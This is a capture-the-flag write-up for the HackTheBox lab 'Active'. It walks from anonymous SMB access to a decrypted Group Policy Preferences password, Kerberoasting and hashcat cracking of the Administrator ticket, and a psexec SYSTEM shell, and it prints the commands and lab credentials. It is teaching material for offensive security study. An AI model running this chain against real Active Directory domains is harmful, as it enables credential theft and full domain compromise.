# HackTheBox — Active

**Platform:** HackTheBox  
**Difficulty:** Easy (but AD concepts are Hard-level)  
**OS:** Windows (Active Directory)  
**Category:** Active Directory / GPP Password / Kerberoasting  
**Status:** Retired  

---

## Summary

Active is a Windows Active Directory box that teaches two critical AD attack techniques: recovering a password from a Group Policy Preference (GPP) XML file exposed on an SMB share, and Kerberoasting a privileged service account to crack its TGS ticket offline. The result is full Domain Admin access.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/active 10.10.10.100
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
49152-49157/tcp open msrpc
```

Domain: **active.htb**

---

## SMB Enumeration — Unauthenticated

### List Shares

```bash
smbclient -L //10.10.10.100 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Replication     Disk
SYSVOL          Disk      Logon server share
Users           Disk
```

`Replication` is accessible anonymously:

```bash
smbclient //10.10.10.100/Replication -N
```

### Enumerate Replication Share

```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Download everything. Find the GPP file:

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

---

## GPP Password Decryption

### Contents of Groups.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" 
        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" 
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
                changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" 
                userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

The `cpassword` field uses AES-256 encryption with a **static key published by Microsoft** (MS14-025). It's trivially decryptable:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```
GPPstillStandingStrong2k18
```

**Credentials:** `SVC_TGS:GPPstillStandingStrong2k18`

---

## SMB Enumeration — Authenticated

```bash
smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18
```

```
smb: \> ls
SVC_TGS\Desktop\user.txt
```

### User Flag

```bash
get SVC_TGS\Desktop\user.txt
cat user.txt
```

---

## Privilege Escalation — Kerberoasting

### Request TGS for Service Accounts

With valid domain credentials, we can request Kerberos TGS tickets for any account with an SPN (Service Principal Name). The ticket is encrypted with the account's NTLM hash — crackable offline.

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 \
  -dc-ip 10.10.10.100 \
  -request \
  -outputfile kerberoast.hashes
```

```
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet
--------------------  -------------  --------------------------------------------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40
```

The **Administrator** account has an SPN — this is unusual and directly exploitable!

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$...
```

### Crack the TGS Ticket

```bash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

```
Ticketmaster1968
```

### Full Domain Admin Access

```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
```

**Domain Admin / SYSTEM shell.**

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- **GPP passwords** (cpassword in Groups.xml) use a static published AES key — always decrypt them with `gpp-decrypt`
- `SYSVOL` and `Replication` shares often contain GPP XML files — enumerate them recursively
- **Kerberoasting** requests TGS tickets for any SPN-bearing account — the ticket hash is crackable offline
- A Kerberoastable Administrator account = direct path to Domain Admin
- `GetUserSPNs.py` from Impacket automates the full Kerberoast workflow
- MS14-025 patched GPP password storage — but legacy policies may still be present

---

## CVE References

- **MS14-025** — Group Policy Preferences Password Exposure

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| smbclient | SMB share enumeration & file download |
| gpp-decrypt | GPP cpassword decryption |
| GetUserSPNs.py | Kerberoasting |
| hashcat | TGS ticket cracking |
| psexec.py | Domain Admin access |
